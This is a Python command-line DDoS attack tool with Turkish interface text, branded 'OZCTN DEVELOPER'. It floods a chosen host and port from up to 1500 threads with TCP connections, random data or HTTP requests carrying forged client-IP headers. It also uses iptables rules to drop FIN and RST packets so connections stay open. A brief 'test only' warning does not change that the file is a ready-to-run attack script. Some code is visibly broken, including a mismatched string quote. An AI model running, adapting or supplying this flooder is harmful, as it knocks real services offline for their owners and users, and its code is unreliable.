#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
from time import sleep, time
from threading import Thread, Lock, active_count
from os import system, geteuid
import random
import string
import signal
import ssl
import argparse
import sys

# Renkli ve emojili çıktılar için
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

emoji = {
    "fire": "🔥",
    "rocket": "🚀",
    "skull": "💀",
    "warning": "⚠️",
    "success": "✅",
    "error": "❌",
    "info": "ℹ️",
    "target": "🎯",
    "network": "🌐",
    "stats": "📊",
    "timer": "⏱️",
    "zap": "⚡",
    "boom": "💥",
    "alien": "👽",
    "ghost": "👻"
}

# OZCTN DEVELOPER Banner
BANNER = f"""
{Colors.PURPLE}{Colors.BOLD}
 ██████╗ ███████╗ ██████╗████████╗███╗   ██╗
██╔═══██╗╚══███╔╝██╔════╝╚══██╔══╝████╗  ██║
██║   ██║  ███╔╝ ██║        ██║   ██╔██╗ ██║
██║   ██║ ███╔╝  ██║        ██║   ██║╚██╗██║
╚██████╔╝███████╗╚██████╗   ██║   ██║ ╚████║
 ╚═════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝
                                             
 ██████╗ ███████╗██╗   ██╗██████╗ ███████╗██╗      
██╔═══██╗██╔════╝██║   ██║██╔══██╗██╔════╝██║      
██║   ██║█████╗  ██║   ██║██║  ██║█████╗  ██║      
██║   ██║██╔══╝  ██║   ██║██║  ██║██╔══╝  ██║      
╚██████╔╝██║     ╚██████╔╝██████╔╝███████╗███████╗ 
 ╚═════╝ ╚═╝      ╚═════╝ ╚═════╝ ╚══════╝╚══════╝ 
{Colors.END}
{Colors.CYAN}{Colors.BOLD}          🚀 ULTRA DDoS SALDIRI ARACI 🚀{Colors.END}
{Colors.YELLOW}         💀 Sadece Test Amaçlı Kullanın! 💀{Colors.END}
"""

example_text = f'''\n{Colors.BOLD}🗲 OZCTN DEVELOPER ULTRA DDoS Aracı 🗲{Colors.END}

{Colors.YELLOW}📖 KULLANIM ÖRNEKLERİ:{Colors.END}
  python3 {sys.argv[0]} example.com/test.php -p 80 -http
  python3 {sys.argv[0]} example.com/hello/ -p 443 -ssl -http
  python3 {sys.argv[0]} example.com -p 80 -http 
  python3 {sys.argv[0]} example.com -p 21 -payload 68656c6c6f
  python3 {sys.argv[0]} example.com -p 22 -t 1500 -time 60

{Colors.CYAN}📊 İSTATİSTİK AÇIKLAMALARI:{Colors.END}
  {emoji["network"]}  Bağlantılar - Hedefe yapılan TCP bağlantıları
  {emoji["rocket"]}  Gönderilen - Hedefe gönderilen payload sayısı
  {emoji["error"]}  Başarısız  - Başarısız bağlantı/gönderim sayısı
  {emoji["timer"]}  Süre       - Saldırının başlangıcından itibaren geçen süre
  {emoji["stats"]}  Hız        - Saniyedeki işlem sayısı

{Colors.RED}⚠️  UYARI: Sadece kendi sistemlerinizde test amaçlı kullanın!{Colors.END}
"""

parser = argparse.ArgumentParser(
    epilog=example_text, 
    formatter_class=argparse.RawTextHelpFormatter
)
parser._action_groups.pop()
required = parser.add_argument_group(f'{Colors.RED}🔰 ZORUNLU PARAMETRELER{Colors.END}')
optional = parser.add_argument_group(f'{Colors.YELLOW}🎛️  OPSİYONEL PARAMETRELER{Colors.END}')

required.add_argument('target', help='Hedef URL/IP adresi')
required.add_argument('-p', '--port', dest='port', type=int, required=True, 
                     help='Hedef port numarası')

optional.add_argument('-t', '--threads', dest='threads', type=int, default=1500,
                     help=f'Thread sayısı (Varsayılan: {Colors.BOLD}1500{Colors.END})')
optional.add_argument('-ssl', action='store_true', help='SSL/TLS kullan')
optional.add_argument('-http', action='store_true', 
                     help='HTTP headerları kullan (Özel payload yoksa)')
optional.add_argument('-payload', help='Özel payload (hex formatında)')
optional.add_argument('-time', '--duration', type=int, default=0,
                     help='Saldırı süresi (saniye)')
optional.add_argument('-v', '--verbose', action='store_true', 
                     help='Detaylı çıktı modu')
optional.add_argument('-no-banner', action='store_true', 
                     help='Banner gösterme')

print(BANNER)

args = parser.parse_args()

# Global istatistikler - OPTİMİZE EDİLDİ
class Statistics:
    def __init__(self):
        self.connected = 0
        self.payloads = 0
        self.failed = 0
        self.start_time = time()
        self.lock = Lock()
        self.last_update = time()
    
    def update(self, connected=0, payloads=0, failed=0):
        with self.lock:
            self.connected += connected
            self.payloads += payloads
            self.failed += failed
    
    def get_stats(self):
        with self.lock:
            return self.connected, self.payloads, self.failed, time() - self.start_time

stats = Statistics()

# Signal handler
stop = False
def signal_handler(signum, frame):
    global stop
    print(f"\n\n{Colors.YELLOW}{emoji['warning']} Saldırı durduruluyor...{Colors.END}")
    stop = True

signal.signal(signal.SIGINT, signal_handler)

# Root kontrolü
if geteuid() != 0:
    print(f"{Colors.RED}{emoji['error']} Bu aracı root olarak çalıştırmanız gerekiyor!{Colors.END}")
    sys.exit(1)

# Hedef URL ayıklama
target = args.target.replace('http://', '').replace('https://', '')
if '/' in target and args.http:
    path = target[target.find('/'):]
    target = target[:target.find('/')]
else:
    path = '/'

# Payload decode
custom_payload = b''
if args.payload:
    try:
        custom_payload = bytes.fromhex(args.payload)
        print(f"{Colors.GREEN}{emoji['success']} Özel payload kullanılıyor: {args.payload}{Colors.END}")
    except ValueError:
        print(f"{Colors.RED}{emoji['error']} Geçersiz hex payload!{Colors.END}")
        sys.exit(1)

# IPTables kuralları
try:
    target_ip = socket.gethostbyname(target)
    print(f"{Colors.CYAN}{emoji['target']} Hedef: {target} ({target_ip}:{args.port}){Colors.END}")
except socket.gaierror:
    print(f"{Colors.RED}{emoji['error']} Hedef bulunamadı: {target}{Colors.END}")
    sys.exit(1)

# Socket optimizasyonları
socket.setdefaulttimeout(1)  # Daha agresif timeout

try:
    system(f'iptables -A OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags FIN FIN -j DROP 2>/dev/null')
    system(f'iptables -A OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags RST RST -j DROP 2>/dev/null')
    print(f"{Colors.GREEN}{emoji['success']} IPTables kuralları eklendi{Colors.END}")
except:
    print(f"{Colors.YELLOW}{emoji['warning']} IPTables kuralları eklenemedi{Colors.END}")

# Rastgele string generator - OPTİMİZE
def random_string(size=None):
    if size is None:
        size = random.randint(8, 25)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

# ÖN HAZIRLANMIŞ HTTP payload'lar - PERFORMANS İÇİN
http_payloads_cache = []
def init_http_payloads_cache(count=50):
    """Önceden payload hazırla"""
    for _ in range(count):
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'OZCTN-DDoS-Bot/3.0'
        ]
        
        method = random.choice(methods)
        payload = f'{method} {path}?{random_string()}={random_string()}&_={int(time()*1000)} HTTP/1.1\r\n'
        payload += f'Host: {target}\r\n'
        payload += f'User-Agent: {random.choice(user_agents)}\r\n'
        payload += f'Accept: */*\r\n'
        payload += f'Accept-Language: en-US,en;q=0.9\r\n'
        payload += f'Connection: keep-alive\r\n'
        payload += f'Cache-Control: no-cache\r\n'
        payload += f'X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n'
        payload += f'X-Real-IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n'
        payload += f'CF-Connecting_IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n'
        
        if method in ['POST', 'PUT']:
            payload += f'Content-Type: application/x-www-form-urlencoded\r\n'
            content = f'data={random_string(100)}'
            payload += f'Content-Length: {len(content)}\r\n\r\n'
            payload += content
        else:
            payload += '\r\n'
        
        http_payloads_cache.append(payload.encode())

# Cache'i başlat
if args.http and not args.payload:
    init_http_payloads_cache(100)
    print(f"{Colors.GREEN}{emoji['success']} 100 HTTP payload ön-hazırlandı{Colors.END}")

# Saldırı thread'i - YÜKSEK PERFORMANS
def attack_thread(thread_id):
    thread_stats = {'connected': 0, 'payloads': 0, 'failed': 0}
    last_update = time()
    
    # Thread-local socket pool
    sockets_pool = []
    
    while not stop:
        # Süre kontrolü
        if args.duration > 0 and (time() - stats.start_time) > args.duration:
            break
            
        try:
            # Socket oluştur (pool'dan al veya yeni yap)
            s = None
            if sockets_pool:
                s = sockets_pool.pop()
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)  # Daha kısa timeout
            
            # Bağlan
            s.connect((target_ip, args.port))
            thread_stats['connected'] += 1
            
            # SSL
            if args.ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target, suppress_ragged_eofs=False)
            
            # Payload seç
            if custom_payload:
                payload = custom_payload
            elif args.http:
                payload = random.choice(http_payloads_cache)
            else:
                payload = f"{random_string(50)}\n".encode()
            
            # Gönder
            s.send(payload)
            thread_stats['payloads'] += 1
            
            # Socket'i pool'a geri koy (yeniden kullanım için)
            if len(sockets_pool) < 5:  # Pool boyutunu sınırla
                sockets_pool.append(s)
            else:
                s.close()
            
        except Exception:
            thread_stats['failed'] += 1
            # Hata durumunda socket'i kapat
            if 's' in locals() and s:
                try:
                    s.close()
                except:
                    pass
        
        # İstatistik güncelleme - DAHA SIK
        current_time = time()
        if current_time - last_update >= 0.2:  # 0.2 saniyede bir güncelle
            stats.update(**thread_stats)
            thread_stats = {'connected': 0, 'payloads': 0, 'failed': 0}
            last_update = current_time
    
    # Thread sonunda tüm socket'leri kapat
    for s in sockets_pool:
        try:
            s.close()
        except:
            pass
    
    # Kalan istatistikleri gönder
    stats.update(**thread_stats)

# İstatistik gösterici - GELİŞMİŞ
def show_stats():
    last_connected, last_payloads, last_failed = 0, 0, 0
    last_time = time()
    peak_speed = 0
    
    while not stop:
        try:
            current_connected, current_payloads, current_failed, total_time = stats.get_stats()
            current_time = time()
            elapsed = current_time - last_time
            
            # Hız hesapla
            conn_speed = (current_connected - last_connected) / elapsed if elapsed > 0.5 else 0
            payload_speed = (current_payloads - last_payloads) / elapsed if elapsed > 0.5 else 0
            
            # Peak hızı güncelle
            peak_speed = max(peak_speed, payload_speed)
            
            # Ekranı temizle
            system('clear')
            
            # Banner
            print(f"{Colors.PURPLE}{Colors.BOLD}OZCTN DEVELOPER - ULTRA DDoS {emoji['alien']}{Colors.END}")
            print(f"{Colors.CYAN}{'='*70}{Colors.END}")
            
            # Hedef bilgisi
            print(f"{emoji['target']}  {Colors.BOLD}Hedef:{Colors.END} {Colors.WHITE}{target}:{args.port}{Colors.END} ({target_ip})")
            print(f"{emoji['rocket']}  {Colors.Bold}Thread:{Colors.END} {args.threads} | {emoji['timer']}  {Colors.BOLD}Süre:{Colors.END} {int(total_time)}s")
            print(f"{Colors.CYAN}{'='*70}{Colors.END}")
            
            # Ana istatistikler
            print(f"\n{emoji['network']}  {Colors.GREEN}Bağlantılar: {Colors.BOLD}{current_connected:,}{Colors.END}")
            print(f"{emoji['zap']}  {Colors.BLUE}Gönderilen:  {Colors.BOLD}{current_payloads:,}{Colors.END}")
            print(f"{emoji['error']}  {Colors.RED}Başarısız:   {Colors.BOLD}{current_failed:,}{Colors.END}")
            
            # Hız istatistikleri
            print(f"\n{emoji['stats']}  {Colors.YELLOW}Anlık Hız:   {Colors.BOLD}{payload_speed:.0f}/s{Colors.END}")
            print(f"{emoji['fire']}  {Colors.RED}Tepe Hız:    {Colors.BOLD}{peak_speed:.0f}/s{Colors.END}")
            
            # Progress bar benzeri gösterge
            total_ops = current_connected + current_payloads + current_failed
            if total_ops > 0:
                success_rate = (current_connected / total_ops) * 100
                print(f"{emoji['boom']}  {Colors.PURPLE}Başarı:      {Colors.BOLD}{success_rate:.1f}%{Colors.END}")
                
                # Performans yıldızları
                performance = "★" * min(5, int(payload_speed / 2000) + 1)
                print(f"{emoji['ghost']}  {Colors.CYAN}Performans:  {Colors.BOLD}{performance}{Colors.END}")
            
            print(f"\n{Colors.YELLOW}⏹️  Durdurmak için CTRL+C {Colors.END}")
            
            last_connected, last_payloads, last_failed = current_connected, current_payloads, current_failed
            last_time = current_time
            
            sleep(0.5)  # Daha hızlı güncelleme
        except Exception as e:
            if args.verbose:
                print(f"{Colors.RED}İstatistik hatası: {e}{Colors.END}")
            sleep(1)

# Ana program
if __name__ == '__main__':
    if not args.no_banner:
        print(BANNER)
    
    print(f"{Colors.GREEN}{emoji['rocket']} YÜKSEK PERFORMANS SALDIRISI BAŞLATILIYOR...{Colors.END}")
    print(f"{Colors.CYAN}Threadler: {args.threads}{Colors.END}")
    print(f"{Colors.CYAN}Süre: {args.duration if args.duration > 0 else 'Sınırsız'}s{Colors.END}")
    print(f"{Colors.CYAN}Hedef: {target}:{args.port}{Colors.END}")
    
    # Thread'leri başlat - DAHA FAZLA THREAD
    threads = []
    for i in range(args.threads):
        t = Thread(target=attack_thread, args=(i+1,))
        t.daemon = True
        threads.append(t)
    
    # Thread'leri gruplar halinde başlat (sistem yükünü dengelemek için)
    batch_size = 100
    for i in range(0, len(threads), batch_size):
        batch = threads[i:i + batch_size]
        for t in batch:
            t.start()
        sleep(0.1)  # Küçük gecikme
    
    print(f"{Colors.GREEN}{emoji['success']} {len(threads)} thread başlatıldı{Colors.END}")
    
    # İstatistik thread'ini başlat
    stats_thread = Thread(target=show_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Ana döngü
    try:
        while not stop:
            if args.duration > 0 and (time() - stats.start_time) > args.duration:
                print(f"\n{Colors.YELLOW}{emoji['timer']} Saldırı süresi doldu!{Colors.END}")
                stop = True
            
            # Thread kontrolü
            alive_threads = sum(1 for t in threads if t.is_alive())
            if alive_threads < args.threads * 0.7:  # %70'ten az çalışıyorsa
                print(f"{Colors.YELLOW}{emoji['warning']} Thread kaybı: {alive_threads}/{args.threads}{Colors.END}")
                # Yeniden başlat
                for i in range(args.threads - alive_threads):
                    t = Thread(target=attack_thread, args=(i+1000,))
                    t.daemon = True
                    t.start()
                    threads.append(t)
            
            sleep(1)
            
    except KeyboardInterrupt:
        stop = True
    except Exception as e:
        print(f"{Colors.RED}Beklenmeyen hata: {e}{Colors.END}")
        stop = True
    
    # Temizlik
    print(f"\n{Colors.YELLOW}{emoji['warning']} Temizlik yapılıyor...{Colors.END}")
    
    try:
        system(f'iptables -D OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags FIN FIN -j DROP 2>/dev/null')
        system(f'iptables -D OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags RST RST -j DROP 2>/dev/null')
        print(f"{Colors.GREEN}{emoji['success']} IPTables kuralları temizlendi{Colors.END}")
    except:
        print(f"{Colors.YELLOW}{emoji['warning']} IPTables temizleme başarısız{Colors.END}")
    
    # Son istatistikler
    final_connected, final_payloads, final_failed, total_time = stats.get_stats()
    
    print(f"\n{Colors.BOLD}{Colors.PURPLE}🎯 SALDIRI TAMAMLANDI {emoji['success']}{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{emoji['network']}  Toplam Bağlantı: {Colors.GREEN}{final_connected:,}{Colors.END}")
    print(f"{emoji['zap']}  Toplam Gönderim:  {Colors.BLUE}{final_payloads:,}{Colors.END}")
    print(f"{emoji['error']}  Toplam Hata:      {Colors.RED}{final_failed:,}{Colors.END}")
    print(f"{emoji['timer']}  Toplam Süre:     {Colors.YELLOW}{int(total_time)}s{Colors.END}")
    
    if total_time > 0:
        avg_speed = final_payloads / total_time
        print(f"{emoji['stats']}  Ortalama Hız:    {Colors.CYAN}{avg_speed:.0f} payload/s{Colors.END}")
        
        total_ops = final_connected + final_payloads + final_failed
        if total_ops > 0:
            success_rate = (final_connected / total_ops) * 100
            print(f"{emoji['boom']}  Başarı Oranı:    {Colors.PURPLE}{success_rate:.1f}%{Colors.END}")
    
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.GREEN}{emoji['success']} OZCTN DEVELOPER - Saldırı tamamlandı!{Colors.END}")
